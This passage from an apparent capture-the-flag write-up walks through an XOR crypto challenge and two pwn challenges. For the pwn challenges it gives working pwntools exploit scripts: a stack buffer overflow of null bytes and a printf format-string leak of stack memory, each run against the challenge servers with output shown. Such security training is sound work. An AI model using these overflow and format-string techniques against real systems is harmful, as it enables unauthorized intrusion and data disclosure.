>>> ''.join(format(int(a, 16) ^ int(b, 16), 'x') for a,b in zip("19217545","11111111"))
'08306454'
````

I'll leave figuring out the exact details as an excercise to the reader :)

The first string is obviously the first four bytes of the encrypted string. What we need to put as the XOR'ed value is the hex value of the _original_ plain text. Mentioned previously, we know that is _pctf_.

```python
>>> import binascii
>>> binascii.hexlify(b"pctf")
b'70637466'
```

OK - plug that in to the first command and we get the key:

```
...
69420123
```

Now that we have the key, we can iterate through each four byte chunk of the cipher text and generate the plaintext. The following python snippet does so:

```python
#!/usr/bin/env python
import binascii

# From exiftool fr3sh_h4rv3st.jpg
# Could try a python wrapper for it, but meh downloads
artist = "1921754512366910363569105a73727c592c5e5701715e571b76304d3625317c1b72744d0d1d354d0d1d73131c2c655e"

# Hint is that the key is 4 bytes, can play around with first 8 bytes of the input
# in the python interpreter to try to find out the key used, since we know the
# beginning of the output has to be pctf and XOR is it's own inverse
KEY = "69420123"

# Set our byte size for the sliding window
chunk=8
index = 0
thelaunchcode = []

# Slide through the artist string and XOR each group with our key
for window in range(int(len(artist)/chunk)):
    if index == 0:
        window_bytes = artist[index:index+chunk]
        thelaunchcode.append(binascii.unhexlify(''.join(format(int(a, 16) ^ int(b, 16), 'x') for a,b in zip(window_bytes, KEY))))
    else:
        window_bytes = artist[index*chunk:index*chunk+chunk]
        thelaunchcode.append(binascii.unhexlify(''.join(format(int(a, 16) ^ int(b, 16), 'x') for a,b in zip(window_bytes, KEY))))
    # Increment index for our next window
    index += 1

# Look door, get key
print(b''.join(thelaunchcode))
```

Running it, we get the flag:

```
python blah.py
b'pctf{th3_wh331s_0n_th3_tr41n_g0_r0und_4nd_r0und}'
```

## Addendum
Instead of using Python, once we figured out the key, we could have used something like so from [Cyberchef](https://gchq.github.io/CyberChef/):

&nbsp;
![]({{ site.baseurl }}/img/cyberchef_xor.png)
&nbsp;


# PWN

## Department of Flying Vehicles
> Dave ruined the code for the DFV starship registry system. Please help fix it.
>
> nc pwn.ctf.b01lers.com 1001
>
> [0da7785b7b6125beabc9b3eba9ae68ff](https://storage.googleapis.com/b0ctf-deploy/dfv.tgz)

If we connect to that endpoint:

```
nc pwn.ctf.b01lers.com 1001
Dave has ruined our system. He updated the code, and now he even has trouble checking his own liscense!
If you can please make it work, we'll reward you!

Welcome to the Department of Flying Vehicles.
Which liscense plate would you like to examine?
 > AAAAAAAAAA
Error.
```

Downloading the attached file gives us a single executable: `dfv`.

Checking that file:

```
file dfv
dfv: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=571aba88a3699a3b83be95160b3230cbf65cec69, stripped
```

Bummer, it's stripped. But, we see it's a 64-bit dynamically linked executable.

Checking it's securities:

```python
checksec dfv
[*] Checking for new versions of pwntools
    To disable this functionality, set the contents of /Users/gp/.pwntools-cache-3.8/update to 'never'.
[*] You have the latest version of Pwntools (4.0.1)
[*] '/Users/gp/Downloads/dfv/dfv'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

If we open it up in [Cutter](https://cutter.re/), we can find the `main` function. I've enabled Cutter's Decompiled (via a Ghidra plugin), Dissasembled, and Function Graph views:

&nbsp;
![]({{ site.baseurl }}/img/dfv/cutter_main.png)

_Open image in new tab for zoom in/out_
{: style="text-align: center; font-size: 80%"}
&nbsp;


I've also renamed some of the local variables to be indicative of what they are.

In summary, it has two static values, one of which is the string "COOLDAV", and the other I renamed `xor_key_against_cooldav`. It XORs the two, and stores that in a variable (I've renamed to `cooldav_against_xor_key`).

Then, it takes our user input (I've renamed to `user_input`), and XOR's that against the `cooldav_against_xor_key` variable).

Then, if that result is equal to the original `cooldav_against_xor_key`, it continues, otherwise it quits.

We know [XOR is it's own inverse (still)](https://bigpick.github.io/TodayILearned/articles/2020-03/xor-inverse), so in order for this to work, we'd need to pass COOLDAV.

Once satisfied, it continues (visible by the top most green arrow here, stemming from the initial main block):

&nbsp;
![]({{ site.baseurl }}/img/dfv/cutter_main_pass_check.png)
&nbsp;

But wait! Now that we're here, if our input matches COOLDAV (which it had to have, for us to get to this point), it just prints hello and quits!

So, we need to satisfy the initial check to get into this block, but then also fail the COOLDAV check, to get the flag.

We can see from the Cutter output that our input is sitting at `rbp-0x20`, and then the xor variables sit immediately after it:


&nbsp;
![]({{ site.baseurl }}/img/dfv/cutter_main_def.png)
&nbsp;

Which means that we'd need to pass 16 characters from the beginning of our input to get to the `cooldav_against_xor_key`:

```python
>>> 0x20 - 0x10
16
```

So, we write 8 chars for our legitimate input, then 8 more chars for the key, then 8 more chars for the result of "COOLDAV" ^ key.

In order to satisfy the if checks to get to the flag, we need our input XOR'ed with COOLDAV to match whatever we give it for the result.

An easy way to do this is just set all bytes to null:

```python
#!/usr/bin/env python
from pwn import *

context.bits= '64'
context.endian= 'little'
#context.log_level = 'debug'

conn = remote('pwn.ctf.b01lers.com', 1001)

conn.recvuntil(" > ")
payload = p64(0x0)*24
conn.sendline(payload)
while 1<2:
    try:
        print(conn.recvlineS())
    except EOFError as e:
        break
```
Results:
```
python dfv_pwn.py
[+] Opening connection to pwn.ctf.b01lers.com on port 1001: Done
b"Thank you so much! Here's your reward!\n"
b'pctf{sp4c3_l1n3s_R_sh0r7!}\n'
b'*** stack smashing detected ***: <unknown> terminated\n'
b'/home/dfv/wrapper.sh: line 2:  8065 Aborted                 (core dumped) ./dfv\n'
```

Flag: `pctf{sp4c3_l1n3s_R_sh0r7!}`

(Alternatively, we could also post 8 chars, 8 null-bytes, and then the same 8 chars, as that would essentially make the XOR a nop, like)

```python
# ...
payload = "a"*8 + "\00"*8 + "a"*8
# ...
```

## Jumpdrive
> Dave is running away from security at the DFV. Help him reach safety
>
> nc pwn.ctf.b01lers.com 1002
>
> [53542656d8f6b156e6a8acd15cb57f49](https://storage.googleapis.com/b0ctf-deploy/jumpdrive.tgz)

If we connect to that nc endpoint, we get a menu prompt, which just spits back out what we give it, then quits:

```
nc pwn.ctf.b01lers.com 1002
Charging up the jump drive...
Reading the destination coordinates...
Where are we going?
Uranus
Uranus
```

Upon initial local exeuction, we're greeted with a Seg fault right away:

```
./jumpdrive
Charging up the jump drive...
Reading the destination coordinates...
Segmentation fault
```

If we open it up in cutter, and look at main's Graph, we see:

&nbsp;
![]({{ site.baseurl }}/img/jumpdrive/jumpdrive_graph.png)
&nbsp;

So, it looks like it's probably seg faulting locally since we don't have a `flag.txt` file. If we create one locally, it runs now:

```
echo 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA' > flag.txt
./jumpdrive
Charging up the jump drive...
Reading the destination coordinates...
Where are we going?
Uranus
Uranus
```

Nice.

Looking back at the Cutter output, let's grok what's going on.

It looks like it stores the `flag.txt` file into a stream, reading each char until it hits `0xff` (which is EOF when using fgetc). Then, it asks us where we're going (safely, using fgets), and then just print's out what we entered (using printf).

*But*, look at the decompiled code:

&nbsp;
![]({{ site.baseurl }}/img/jumpdrive/decompiled_loop.png)
&nbsp;

Looks like a [printf vulnerability](http://www.cis.syr.edu/~wedu/Teaching/cis643/LectureNotes_New/Format_String.pdf) to me!

So, since we're streaming the flag characters to the stack, we should be able to just printf that location on the stack, and get our flag characters!

This is done using the `%s` format parameter, and also syntax like `"%200$p"` which indicates to read the 200th item on the stack.

We can use some guessing to try to find where our input starts on the stack (which happens to be 10th). Or, we can loop through a bunch of items until we have the whole flag printed:

```python
#!/usr/bin/env python
from pwn import *

context.bits= '64'
context.endian= 'little'
#context.log_level = 'debug'

for i in range(1, 20):
    conn = remote('pwn.ctf.b01lers.com', 1002)
    conn.recvuntil("Where are we going?\n")
    payload = f"%{i}$p"
    conn.sendline(payload)
    context.log_level = 'error'
    while 1<2:
        try:
            print("".join(map(chr, unhex(conn.recvlineS().strip()[2:])[::-1])), end ='')
        except EOFError as e:
            break
        except UnicodeDecodeError as e2:
            continue
print()
```

And running this, give's us:

```python
python jumpdrive_pwn.py
[+] Opening connection to pwn.ctf.b01lers.com on port 1002: Done
ðû³\x1c\xbd\x7fÐ¨Î\x0e@WF\x7fÀÈÂ;\x7fÀ$øKÚ\x7fhbNÿ\x1b\x00\x00ï¾­Þ`¢xÑhU6Í;NÑ\x11@pctf{pr1nTf_1z_4_St4R_m4p}
\x00\x8e\x7f
...
```

Look at that! Flag is `pctf{pr1nTf_1z_4_St4R_m4p}`
